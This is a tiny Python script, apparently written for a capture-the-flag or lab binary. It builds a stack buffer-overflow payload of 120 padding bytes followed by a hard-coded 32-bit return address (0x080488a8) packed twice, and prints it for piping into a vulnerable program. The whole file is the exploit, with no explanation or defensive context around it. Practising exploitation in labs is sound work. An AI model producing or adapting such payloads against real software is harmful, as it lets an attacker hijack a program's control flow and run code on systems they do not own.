#!/usr/bin/python

from struct import pack

target=0x080488a8
ebp_value=0x41414141
overflow=120

buff=b"A"*overflow+pack("<I",target)+pack("<I",target)

print(buff)


